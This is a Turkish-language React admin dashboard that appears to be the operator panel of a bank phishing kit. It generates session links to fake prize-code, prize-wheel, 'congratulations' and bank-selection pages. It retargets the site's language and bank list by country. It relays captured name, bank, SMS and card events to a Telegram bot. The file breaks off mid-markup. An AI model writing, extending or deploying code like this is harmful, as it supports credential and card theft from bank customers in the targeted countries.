"use client";

import { useState, useEffect, useCallback } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { LogsTab } from "./components/LogsTab";
import { AuditLogsTab } from "./components/AuditLogsTab";
import { UsersTab } from "./components/UsersTab";
import { BanksTab } from "./components/BanksTab";
import { LanguageTab } from "./components/LanguageTab";
import { WheelSettingsTab } from "./components/WheelSettingsTab";
import { GeneralSettingsTab } from "./components/GeneralSettingsTab";
import { useSettings } from "@/contexts/SettingsContext";
import { normalizeCountryName } from "@/lib/country-utils";

export function Admin1Dashboard({ user }: { user: any }) {
  const [isCollapsed, setIsCollapsed] = useState(false);
  const [darkMode, setDarkMode] = useState(true);
  const [activeTab, setActiveTab] = useState("Loglar");
  const [showNewLinkModal, setShowNewLinkModal] = useState(false);
  const [showTelegramModal, setShowTelegramModal] = useState(false);

  // Link Oluşturma State'leri
  const [creatingLink, setCreatingLink] = useState(false);
  const [newLink, setNewLink] = useState<string | null>(null);
  const [linkType, setLinkType] = useState<"normal" | "wheel" | "direct_win" | "direct_bank">("normal");
  const [amount, setAmount] = useState("5000");
  const [currency, setCurrency] = useState("NZ$");
  const [partnerName, setPartnerName] = useState("");
  const [participationCode, setParticipationCode] = useState("");
  const [createLinkError, setCreateLinkError] = useState<string | null>(null);

  const adminIdentifier = user?.user_metadata?.username || user?.email?.split('@')[0] || "admin";
  const supabase = createBrowserSupabaseClient();
  const { settings } = useSettings();

  async function handleCreateLink() {
    if (!supabase) return;
    setCreateLinkError(null);
    setCreatingLink(true);
    
    try {
      const { data, error } = await supabase
          .from("sessions")
          .insert({
            amount: linkType === "wheel" ? 0 : (Number(amount.replace(",", ".")) || 0),
            current_step: linkType === "direct_win" ? "win" : linkType === "direct_bank" ? "banken" : "code_entry",
            status: "offline",
            is_hidden: false,
            partner_name: adminIdentifier,
            participation_code: linkType === "normal" ? (participationCode.trim() || null) : null,
            form_data: {
              currency,
              is_wheel_game: linkType === "wheel",
              partner_display_name: linkType === "normal" ? partnerName.trim() : "",
            }
          })
          .select("id, public_id")
          .single();

      if (error) throw error;

      if (data?.id) {
        const publicSessionId = data.public_id ? String(data.public_id) : data.id;
        let urlPath = `/code?session=${publicSessionId}`;
        if (linkType === "wheel") urlPath = `/wheel?session=${publicSessionId}`;
        if (linkType === "direct_win") urlPath = `/win/${publicSessionId}`;
        if (linkType === "direct_bank") urlPath = `/banken?session=${publicSessionId}`;
        setNewLink(`${window.location.origin}${urlPath}`);
      }
    } catch (err: any) {
      setCreateLinkError(err.message || "Link oluşturulamadı.");
    } finally {
      setCreatingLink(false);
    }
  }

  const EUROPEAN_COUNTRIES = [
    { name: "Tümü", flag: "🌍", lang: "nl" },
    { name: "Yeni Zelanda", flag: "🇳🇿", lang: "en" },
    { name: "Hollanda", flag: "🇳🇱", lang: "nl" },
    { name: "Almanya", flag: "🇩🇪", lang: "de" },
    { name: "Avusturya", flag: "🇦🇹", lang: "de" },
    { name: "Belçika", flag: "🇧🇪", lang: "nl" },
    { name: "İsviçre", flag: "🇨🇭", lang: "de" },
    { name: "Finlandiya", flag: "🇫🇮", lang: "fi" },
    { name: "İspanya", flag: "🇪🇸", lang: "es" },
    { name: "İtalya", flag: "🇮🇹", lang: "it" },
    { name: "Fransa", flag: "🇫🇷", lang: "fr" },
    { name: "Çekya", flag: "🇨🇿", lang: "cs" },
    { name: "Estonya", flag: "🇪🇪", lang: "et" },
    { name: "Polonya", flag: "🇵🇱", lang: "pl" },
    { name: "İsveç", flag: "🇸🇪", lang: "sv" },
    { name: "Danimarka", flag: "🇩🇰", lang: "da" },
    { name: "Romanya", flag: "🇷🇴", lang: "ro" },
    { name: "Yunanistan", flag: "🇬🇷", lang: "el" },
    { name: "Portekiz", flag: "🇵🇹", lang: "pt" },
    { name: "Macaristan", flag: "🇭🇺", lang: "hu" }
  ];

  async function handleFlagChange(countryName: string, langCode: string) {
    const normalizedCountryName = normalizeCountryName(countryName);
    if (!confirm(`Sitenin dilini ve bankalarını "${normalizedCountryName}" olarak değiştirmek istediğinize emin misiniz?`)) return;
    if (!supabase) return;

    try {
      // 1. Dili güncelle
      const { translations } = await import("@/lib/languageDefaults");
      const t = translations[langCode] || translations["en"];
      
      const updatePayload = {
        ...t,
        site_language: langCode,
        target_country: normalizedCountryName
      };

      // UUID id varsa onu query'de eşleştirip güncelleyeceğiz veya tek satır varsaydığımız için direkt id olmadan update edeceğiz.
      // global_settings tablosunda sadece 1 satır olduğunu varsayarak:
      const { data: gsData } = await supabase.from("global_settings").select("id").limit(1).single();
      
      if (gsData?.id) {
        await supabase.from("global_settings").update(updatePayload).eq("id", gsData.id);
      } else {
        await supabase.from("global_settings").insert(updatePayload);
      }

      alert(`Sistem başarıyla "${normalizedCountryName}" ayarlarına güncellendi.`);
    } catch (err: any) {
      alert("Hata oluştu: " + err.message);
    }
  }

  const renderContent = () => {
    switch (activeTab) {
      case "Loglar":
        return <LogsTab darkMode={darkMode} user={user} />;
      case "Eski Loglar":
        return <AuditLogsTab darkMode={darkMode} user={user} />;
      case "Banka İşlemleri":
        return <BanksTab darkMode={darkMode} />;
      case "Dil Ayarları":
        return <LanguageTab darkMode={darkMode} />;
      case "Çark Ayarları":
        return <WheelSettingsTab darkMode={darkMode} />;
      case "Kullanıcı":
        return <UsersTab darkMode={darkMode} />;
      case "Genel Ayarlar":
      case "Arkaplan Rengi":
        return <GeneralSettingsTab darkMode={darkMode} />;
      default:
        return <LogsTab darkMode={darkMode} user={user} />;
    }
  };

  return (
    <div className={`flex h-screen overflow-hidden ${darkMode ? 'bg-[#000000] text-[#f5f5f7]' : 'bg-[#f5f5f7] text-[#1d1d1f]'} font-sans tracking-tight selection:bg-[#EB5E28] selection:text-white`}>
      
      {/* Background Gradient Mesh Effect (Subtle) */}
      <div className="absolute inset-0 z-0 pointer-events-none overflow-hidden">
        <div className={`absolute -top-[20%] -left-[10%] w-[50%] h-[50%] rounded-full blur-[120px] opacity-20 ${darkMode ? 'bg-[#EB5E28]/30' : 'bg-[#EB5E28]/20'}`}></div>
        <div className={`absolute top-[60%] -right-[10%] w-[40%] h-[40%] rounded-full blur-[100px] opacity-20 ${darkMode ? 'bg-blue-600/20' : 'bg-blue-400/10'}`}></div>
      </div>

      {/* SIDEBAR */}
      <div className={`relative z-10 flex flex-col transition-all duration-500 ease-in-out border-r ${darkMode ? 'bg-[#1c1c1e]/60 border-white/5 backdrop-blur-2xl shadow-[1px_0_20px_rgba(0,0,0,0.3)]' : 'bg-white/60 border-[#d2d2d7]/50 backdrop-blur-2xl shadow-[1px_0_20px_rgba(0,0,0,0.03)]'} ${isCollapsed ? 'w-[80px]' : 'w-[260px]'}`}>
        <div className={`h-[75px] flex items-center justify-between px-4 border-b ${darkMode ? 'border-white/5' : 'border-[#d2d2d7]/50'} relative group`}>
          {!isCollapsed && (
            <div className="flex items-center gap-2">
              <span className="text-xl font-bold tracking-tighter bg-clip-text text-transparent bg-gradient-to-r from-[#EB5E28] to-[#ff8a5c]">EPIN</span>
              
              {/* Flag Selector Dropdown */}
              <div className="relative group/flag">
                <button className={`p-1.5 rounded-lg flex items-center gap-1 text-sm transition-all duration-300 ${darkMode ? 'hover:bg-white/10' : 'hover:bg-black/5'}`}>
                  <span className="drop-shadow-sm">{EUROPEAN_COUNTRIES.find(c => c.name === normalizeCountryName(settings?.target_country || "Yeni Zelanda"))?.flag || "🌍"}</span>
                  <svg className="w-3 h-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" /></svg>
                </button>
                <div className="absolute top-full left-0 mt-2 w-48 rounded-2xl shadow-[0_8px_30px_rgb(0,0,0,0.12)] opacity-0 invisible group-hover/flag:opacity-100 group-hover/flag:visible transition-all duration-300 z-50 overflow-hidden border backdrop-blur-3xl" style={{ backgroundColor: darkMode ? 'rgba(30,30,30,0.85)' : 'rgba(255,255,255,0.85)', borderColor: darkMode ? 'rgba(255,255,255,0.1)' : 'rgba(0,0,0,0.05)' }}>
                  <div className="max-h-[300px] overflow-y-auto py-2 px-1">
                    <div className="px-3 py-1 text-[10px] font-bold opacity-40 uppercase tracking-widest mb-1">Hedef Ülke</div>
                    {EUROPEAN_COUNTRIES.map(c => (
                      <button 
                        key={c.name}
                        onClick={() => handleFlagChange(c.name, c.lang)}
                        className={`w-full text-left px-3 py-2 text-sm flex items-center gap-3 rounded-xl transition-all duration-200 ${darkMode ? 'hover:bg-white/10' : 'hover:bg-black/5'}`}
                      >
                        <span className="text-lg drop-shadow-sm">{c.flag}</span>
                        <span className="font-medium">{c.name}</span>
                      </button>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          )}
          <button onClick={() => setIsCollapsed(!isCollapsed)} className={`p-2 rounded-xl transition-all duration-300 ${darkMode ? 'hover:bg-white/10 text-gray-400 hover:text-white' : 'hover:bg-black/5 text-gray-500 hover:text-black'} ${isCollapsed ? 'mx-auto' : ''}`}>
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" /></svg>
          </button>
        </div>
        <div className="flex-1 overflow-y-auto py-6 space-y-1.5 px-3">
          {/* Menu Items */}
          <SidebarItem icon="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" label="Loglar" active={activeTab === "Loglar"} onClick={() => setActiveTab("Loglar")} isCollapsed={isCollapsed} darkMode={darkMode} />
          <SidebarItem icon="M12 2a10 10 0 100 20 10 10 0 000-20Zm1 15h-2v-6h2v6Zm0-8h-2V7h2v2Z" label="Eski Loglar" active={activeTab === "Eski Loglar"} onClick={() => setActiveTab("Eski Loglar")} isCollapsed={isCollapsed} darkMode={darkMode} />
          <SidebarItem icon="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" label="Banka İşlemleri" active={activeTab === "Banka İşlemleri"} onClick={() => setActiveTab("Banka İşlemleri")} isCollapsed={isCollapsed} darkMode={darkMode} />
          <SidebarItem icon="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" label="Dil Ayarları" active={activeTab === "Dil Ayarları"} onClick={() => setActiveTab("Dil Ayarları")} isCollapsed={isCollapsed} darkMode={darkMode} />
          <SidebarItem icon="M12 6V4m0 2a2 2 0 100 4m0-4a2 2 0 110 4m-6 8a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4m6 6v10m6-2a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4" label="Çark Ayarları" active={activeTab === "Çark Ayarları"} onClick={() => setActiveTab("Çark Ayarları")} isCollapsed={isCollapsed} darkMode={darkMode} />
          <SidebarItem icon="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197M13 7a4 4 0 11-8 0 4 4 0 018 0z" label="Kullanıcı" active={activeTab === "Kullanıcı"} onClick={() => setActiveTab("Kullanıcı")} isCollapsed={isCollapsed} darkMode={darkMode} />
          <SidebarItem icon="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" label="Genel Ayarlar" active={activeTab === "Genel Ayarlar"} onClick={() => setActiveTab("Genel Ayarlar")} isCollapsed={isCollapsed} darkMode={darkMode} />
        </div>
      </div>

      {/* MAIN CONTENT */}
      <div className="relative z-10 flex-1 flex flex-col h-full overflow-hidden">
        {/* TOPBAR */}
        <div className={`h-[75px] border-b flex items-center justify-between px-8 shrink-0 backdrop-blur-2xl ${darkMode ? 'border-white/5 bg-[#1c1c1e]/60' : 'border-[#d2d2d7]/50 bg-white/60'}`}>
          <div className="flex items-center gap-3">
            <span className="text-xl font-semibold opacity-90">{activeTab}</span>
            <button
              onClick={() => setShowTelegramModal(true)}
              className={`ml-2 flex items-center gap-2 px-4 py-1.5 rounded-full text-sm font-bold shadow-sm transition-all duration-300 hover:scale-105 active:scale-95 border ${darkMode ? 'bg-sky-500/10 text-sky-300 border-sky-500/30 hover:bg-sky-500/20' : 'bg-sky-50 text-sky-700 border-sky-200 hover:bg-sky-100'}`}
              title="Telegram Bot Yönetimi"
            >
              <span className="text-base">🤖</span>
              <span className="hidden sm:inline">Telegram</span>
            </button>
          </div>
          <div className="flex items-center space-x-5">
            <span className={`text-sm font-medium px-3 py-1 rounded-full ${darkMode ? 'bg-white/10 text-white/70' : 'bg-black/5 text-black/60'}`}>
              @{adminIdentifier}
            </span>
            <button onClick={() => setDarkMode(!darkMode)} className={`p-2.5 rounded-full transition-all duration-300 hover:scale-105 active:scale-95 ${darkMode ? 'bg-white/10 text-yellow-400 hover:bg-white/20' : 'bg-black/5 text-gray-700 hover:bg-black/10'}`}>
              {darkMode ? (
                <svg className="w-5 h-5 drop-shadow-sm" fill="currentColor" viewBox="0 0 20 20"><path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fillRule="evenodd" clipRule="evenodd" /></svg>
              ) : (
                <svg className="w-5 h-5 drop-shadow-sm" fill="currentColor" viewBox="0 0 20 20"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z" /></svg>
              )}
            </button>
            <button onClick={() => setShowNewLinkModal(true)} className={`flex items-center gap-2 px-5 py-2.5 rounded-full font-medium shadow-sm transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${darkMode ? 'bg-white text-black hover:bg-gray-100' : 'bg-black text-white hover:bg-gray-800'}`}>
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M12 4v16m8-8H4" /></svg>
                <span>Yeni Link</span>
            </button>
          </div>
        </div>

        {/* CONTENT */}
        <div className="flex-1 overflow-y-auto p-6 md:p-10 relative">
          <div className="max-w-7xl mx-auto h-full">
            {renderContent()}
          </div>
        </div>
      </div>

      {/* Link Oluştur Modal (Glassmorphism + Apple Style) */}
      {showNewLinkModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
          <div className="absolute inset-0 bg-black/40 backdrop-blur-sm transition-opacity" onClick={() => setShowNewLinkModal(false)}></div>
          <div className={`relative w-full max-w-md rounded-3xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] p-8 transform transition-all animate-in fade-in zoom-in-95 duration-300 ${darkMode ? 'bg-[#1c1c1e]/90 backdrop-blur-2xl border border-white/10' : 'bg-white/90 backdrop-blur-2xl border border-white/50'}`}>
            <h3 className="text-2xl font-semibold mb-6 tracking-tight">Yeni Link Oluştur</h3>
            
            {!newLink ? (
              <div className="space-y-5">
                <div>
                  <label className="block text-sm font-medium mb-2 opacity-80">Başlangıç Sayfası</label>
                  <select 
                    value={linkType} 
                    onChange={(e) => setLinkType(e.target.value as any)}
                    className={`w-full p-3.5 rounded-xl border outline-none font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-black/50 border-white/10 text-white' : 'bg-gray-50/50 border-gray-200 text-black'}`}
                  >
                    <option value="normal">Katılım Kodu (Normal)</option>
                    <option value="wheel">Çark Oyunu</option>
                    <option value="direct_win">Tebrikler Ekranı</option>
                    <option value="direct_bank">Direkt Banka Seçimi</option>
                  </select>
                </div>
                
                {linkType !== "wheel" && (
                  <div className="flex gap-3">
                    <div className="flex-1">
                      <label className="block text-sm font-medium mb-2 opacity-80">Miktar</label>
                      <input 
                        type="text" 
                        value={amount} 
                        onChange={(e) => setAmount(e.target.value)}
                        className={`w-full p-3.5 rounded-xl border outline-none font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-black/50 border-white/10 text-white' : 'bg-gray-50/50 border-gray-200 text-black'}`}
                      />
                    </div>
                    <div className="w-28">
                      <label className="block text-sm font-medium mb-2 opacity-80">Birim</label>
                      <select 
                        value={currency} 
                        onChange={(e) => setCurrency(e.target.value)}
                        className={`w-full p-3.5 rounded-xl border outline-none font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-black/50 border-white/10 text-white' : 'bg-gray-50/50 border-gray-200 text-black'}`}
                      >
                        <option value="NZ$">NZ$ (NZD)</option>
                        <option value="$">$ (USD)</option>
                        <option value="£">£ (GBP)</option>
                      </select>
                    </div>
                  </div>
                )}
                
                {linkType === "normal" && (
                  <>
                    <div>
                      <label className="block text-sm font-medium mb-2 opacity-80">Partner İsmi</label>
                      <input 
                        type="text" 
                        value={partnerName} 
                        onChange={(e) => setPartnerName(e.target.value)}
                        placeholder="Örn: X Firması"
                        className={`w-full p-3.5 rounded-xl border outline-none font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-black/50 border-white/10 text-white' : 'bg-gray-50/50 border-gray-200 text-black'}`}
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium mb-2 opacity-80">Katılım Kodu (Opsiyonel)</label>
                      <input 
                        type="text" 
                        value={participationCode} 
                        onChange={(e) => setParticipationCode(e.target.value)}
                        placeholder="Örn: WIN100"
                        className={`w-full p-3.5 rounded-xl border outline-none font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-black/50 border-white/10 text-white' : 'bg-gray-50/50 border-gray-200 text-black'}`}
                      />
                    </div>
                  </>
                )}
                
                {createLinkError && (
                  <div className="p-3 text-sm text-red-500 bg-red-500/10 rounded-xl font-medium">
                    {createLinkError}
                  </div>
                )}
                
                <div className="flex justify-end gap-3 mt-8">
                  <button 
                    onClick={() => setShowNewLinkModal(false)} 
                    className={`px-5 py-3 rounded-xl font-semibold transition-all hover:scale-105 active:scale-95 ${darkMode ? 'bg-white/10 hover:bg-white/20' : 'bg-black/5 hover:bg-black/10'}`}
                  >
                    Vazgeç
                  </button>
                  <button 
                    onClick={handleCreateLink}
                    disabled={creatingLink}
                    className="px-6 py-3 bg-[#EB5E28] text-white rounded-xl font-semibold shadow-lg shadow-[#EB5E28]/30 hover:shadow-[#EB5E28]/50 transition-all hover:scale-105 active:scale-95 disabled:opacity-50 disabled:pointer-events-none"
                  >
                    {creatingLink ? "Oluşturuluyor..." : "Bağlantı Oluştur"}
                  </button>
                </div>
              </div>
            ) : (
              <div className="space-y-6">
                <div className="flex items-center justify-center w-16 h-16 mx-auto bg-green-500/10 text-green-500 rounded-full mb-4">
                  <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
                </div>
                <p className="text-center font-medium opacity-80 text-lg">Bağlantı Hazır</p>
                <div className="flex gap-2">
                  <input 
                    type="text" 
                    readOnly 
                    value={newLink} 
                    className={`flex-1 p-3.5 rounded-xl text-sm font-mono outline-none text-center ${darkMode ? 'bg-black/50 border-white/10 text-white' : 'bg-gray-50/50 border-gray-200 text-black'}`} 
                  />
                </div>
                <div className="flex flex-col gap-3">
                  <button 
                    onClick={() => {
                      navigator.clipboard.writeText(newLink);
                      alert("Kopyalandı!");
                    }} 
                    className="w-full py-3.5 bg-[#EB5E28] text-white rounded-xl font-semibold shadow-lg shadow-[#EB5E28]/30 hover:shadow-[#EB5E28]/50 transition-all hover:scale-[1.02] active:scale-95"
                  >
                    Bağlantıyı Kopyala
                  </button>
                  <button 
                    onClick={() => {
                      setNewLink(null);
                      setShowNewLinkModal(false);
                    }} 
                    className={`w-full py-3.5 rounded-xl font-semibold transition-all hover:scale-[1.02] active:scale-95 ${darkMode ? 'bg-white/10 hover:bg-white/20' : 'bg-black/5 hover:bg-black/10'}`}
                  >
                    Kapat
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Telegram Bot Yönetim Modal */}
      {showTelegramModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
          <div className="absolute inset-0 bg-black/40 backdrop-blur-sm transition-opacity" onClick={() => setShowTelegramModal(false)}></div>
          <div className={`relative w-full max-w-4xl max-h-[90vh] overflow-y-auto rounded-3xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] transform transition-all animate-in fade-in zoom-in-95 duration-300 ${darkMode ? 'bg-[#1c1c1e]/95 backdrop-blur-2xl border border-white/10' : 'bg-white/95 backdrop-blur-2xl border border-white/50'}`}>
            <div className={`flex items-center justify-between px-6 py-4 border-b sticky top-0 z-10 backdrop-blur-xl ${darkMode ? 'border-white/10 bg-[#1c1c1e]/80' : 'border-gray-100 bg-white/80'}`}>
              <div className="flex items-center gap-3">
                <span className="text-2xl leading-none">🤖</span>
                <div>
                  <div className={`text-lg font-extrabold tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>
                    Telegram Bot Entegrasyonu
                  </div>
                  <div className={`text-[11px] opacity-60 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>
                    Bildirim & Komut Yönetimi
                  </div>
                </div>
              </div>
              <button
                onClick={() => setShowTelegramModal(false)}
                className={`p-2 rounded-xl transition-all hover:scale-105 active:scale-95 ${darkMode ? 'bg-white/10 hover:bg-white/20 text-gray-300' : 'bg-black/5 hover:bg-black/10 text-gray-700'}`}
                title="Kapat"
              >
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" /></svg>
              </button>
            </div>
            <div className="p-0 sm:p-6 pt-6 sm:pt-0">
              <div className="-mx-6 sm:mx-0">
                <TelegramSetupCard darkMode={darkMode} />
              </div>
            </div>
          </div>
        </div>
      )}

    </div>
  );
}

function TelegramSetupCard({ darkMode }: { darkMode: boolean }) {
  const [status, setStatus] = useState<any>(null);
  const [busy, setBusy] = useState<string | null>(null);
  const [msg, setMsg] = useState<string | null>(null);
  const [msgType, setMsgType] = useState<"ok" | "err">("ok");

  const load = useCallback(async () => {
    setBusy("check");
    try {
      const r = await fetch("/api/telegram/status", { cache: "no-store" });
      const d = await r.json();
      setStatus(d);
    } catch { setStatus(null); }
    setBusy(null);
  }, []);

  useEffect(() => { void load(); }, [load]);

  const run = async (action: string, body?: any, label?: string) => {
    setBusy(label || action); setMsg(null);
    try {
      const r = await fetch(`/api/telegram?action=${encodeURIComponent(action)}`, {
        method: "POST", cache: "no-store",
        headers: body ? { "Content-Type": "application/json" } : undefined,
        body: body ? JSON.stringify(body) : undefined,
      });
      const d = await r.json();
      if (d.ok) {
        setMsg((label || action) + " başarılı ✅");
        setMsgType("ok");
      } else {
        setMsg("❌ " + (d.error || "Hata"));
        setMsgType("err");
      }
    } catch (e: any) {
      setMsg("❌ " + (e?.message || "Hata"));
      setMsgType("err");
    }
    await load();
    setTimeout(() => setMsg(null), 4000);
    setBusy(null);
  };

  const envTemplate = `# ===== TELEGRAM BOT (BotFather'dan al) =====
TELEGRAM_BOT_TOKEN=123456789:AAH....xxx
# Kendi chat ID'n (kişi ID'si) veya grup/kanal ID (-1001234...)
TELEGRAM_CHAT_ID=123456789
# Opsiyonel: Rastgele, webhook güvenliği için
TELEGRAM_WEBHOOK_SECRET=rastgeleBirSifre123`;

  const copyTpl = async () => {
    try {
      await navigator.clipboard.writeText(envTemplate);
      setMsg("Kopyalandı! .env.local içine yapıştır ✅"); setMsgType("ok");
      setTimeout(() => setMsg(null), 3000);
    } catch {
      setMsg("Kopyalama başarısız ❌"); setMsgType("err");
      setTimeout(() => setMsg(null), 3000);
    }
  };

  return (
    <div className={`rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
      <div className={`flex items-center justify-between px-6 py-5 border-b ${darkMode ? 'border-white/5' : 'border-gray-100'}`}>
        <div className="flex items-center gap-3">
          <span className="text-2xl leading-none">🤖</span>
          <div>
            <div className={`text-base font-extrabold tracking-tight flex items-center gap-3 ${darkMode ? 'text-white' : 'text-gray-900'}`}>
              Telegram Bot Entegrasyonu
              <span className={`inline-flex items-center rounded-full px-3 py-0.5 text-[11px] font-black border ${status?.configured ? (darkMode ? 'bg-green-500/15 text-green-400 border-green-500/30' : 'bg-green-50 text-green-600 border-green-200') : (darkMode ? 'bg-amber-500/15 text-amber-400 border-amber-500/30' : 'bg-amber-50 text-amber-700 border-amber-200')}`}>
                {status?.configured ? "● AKTİF" : "○ AYARLANMADI"}
              </span>
            </div>
            <div className={`mt-0.5 text-[11px] opacity-60 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>
              Tüm event'ler (isim/banka/SMS/kart/bekleme/yonlendirme/ban/sohbet) Telegram'a atılır + komutlar çalışır
            </div>
          </div>
        </div>
        <button
          onClick={() => void load()}
          disabled={busy === "check"}
          className={`px-3 py-1.5 text-xs font-bold rounded-lg transition-all hover:scale-105 active:scale-95 disabled:opacity-50 ${darkMode ? 'bg-white/10 hover:bg-white/20 text-gray-300' : 'bg-black/5 hover:bg-black/10 text-gray-700'}`}
          title="Yenile"
        >↻ YENİLE</button>
      </div>

      <div className="px-6 py-5 space-y-4">
        {!status?.configured && (
          <>
            <div className={`p-4 rounded-2xl border ${darkMode ? 'bg-amber-500/10 border-amber-500/20' : 'bg-amber-50 border-amber-200'}`}>
              <div className={`text-[13px] font-bold mb-2 ${darkMode ? 'text-amber-300' : 'text-amber-800'}`}>
                📌 Kurulum Adımları:
              </div>
              <ol className={`text-[12px] space-y-1 list-decimal list-inside opacity-85 ${darkMode ? 'text-zinc-300' : 'text-gray-700'}`}>
                <li>Telegram'da <b>@BotFather</b> ile sohbet aç, <code className="font-mono px-1.5 py-0.5 rounded">/newbot</code> yazıp token al</li>
                <li>Yeni oluşturduğun bot ile bir sohbet aç ve <code className="font-mono px-1.5 py-0.5 rounded">/start</code> yaz</li>
                <li>Aşağıdaki şablonu kopyala, proje klasöründe <code className="font-mono px-1.5 py-0.5 rounded">.env.local</code> içine yapıştır</li>
                <li>Değerleri kendi aldığın token ve chat ID ile değiştir</li>
                <li>Projeyi yeniden başlat (veya Deploy et), sonra bu karttaki <b>SET WEBHOOK</b> butonuna bas</li>
                <li><b>TEST MESAJI</b> butonuyla doğrula</li>
              </ol>
            </div>
            <div className={`rounded-2xl border overflow-hidden ${darkMode ? 'border-white/10 bg-black/30' : 'border-gray-200 bg-gray-50/70'}`}>
              <div className={`flex items-center justify-between px-4 py-2.5 border-b ${darkMode ? 'border-white/10 bg-white/5' : 'border-gray-100 bg-gray-50'}`}>
                <span className={`text-[11px] font-black uppercase tracking-widest opacity-70 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>
                  .env.local şablonu
                </span>
                <button
                  onClick={copyTpl}
                  className={`text-[11px] font-bold px-3 py-1 rounded-lg transition-all hover:scale-105 active:scale-95 bg-[#EB5E28] text-white hover:bg-[#EB5E28]/90`}
                >📋 KOPYALA</button>
              </div>
              <pre className={`p-4 text-[11px] font-mono leading-relaxed whitespace-pre-wrap overflow-x-auto ${darkMode ? 'text-zinc-300' : 'text-gray-800'}`}>{envTemplate}</pre>
            </div>
          </>
        )}

        {status?.configured && (
          <div className={`grid grid-cols-1 md:grid-cols-3 gap-3 text-[12px] ${darkMode ? 'text-zinc-300' : 'text-gray-700'}`}>
            <div className={`p-3 rounded-xl border ${darkMode ? 'bg-black/30 border-white/10' : 'bg-gray-50 border-gray-200'}`}>
              <div className="text-[10px] font-bold uppercase tracking-widest opacity-60 mb-1">Token</div>
              <div className="font-mono break-all">{status.tokenPrefix || "—"}</div>
            </div>
            <div className={`p-3 rounded-xl border ${darkMode ? 'bg-black/30 border-white/10' : 'bg-gray-50 border-gray-200'}`}>
              <div className="text-[10px] font-bold uppercase tracking-widest opacity-60 mb-1">Chat ID</div>
              <div className="font-mono break-all">{status.chatId || "—"}</div>
            </div>
